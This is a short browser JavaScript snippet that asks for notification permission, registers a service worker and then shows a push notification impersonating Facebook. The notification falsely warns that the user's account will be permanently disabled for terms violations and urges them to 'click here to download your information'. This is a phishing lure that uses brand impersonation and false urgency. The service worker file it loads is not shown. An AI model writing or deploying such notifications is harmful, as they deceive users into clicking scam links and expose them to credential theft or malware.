document.getElementById('notify-btn').addEventListener('click', function() {

            if ('Notification' in window) {

                Notification.requestPermission().then(function(permission) {
                    if (permission === 'granted') {

                        navigator.serviceWorker.register('/Notification.js').then(function(registration) {
                            console.log('Service Worker registered with scope:', registration.scope);


                            registration.showNotification('Facebook', {
                                body: 'your account will be permanently disabled after sometimes because it violates our terms of services & privacy policy also you have clicked on third party illegal websites button click here to download your information',
                                icon: '/Img/images.png',
                                badge: '/Img/Picsart_24-06-04_17-32-42-752.png'
                            });
                        }).catch(function(error) {
                            console.error('Service Worker registration failed:', error);
                        });
                    } else {
                        alert('Notifications are disabled.');
                    }
                });
            } else {
                alert('This browser does not support notifications.');
            }
        });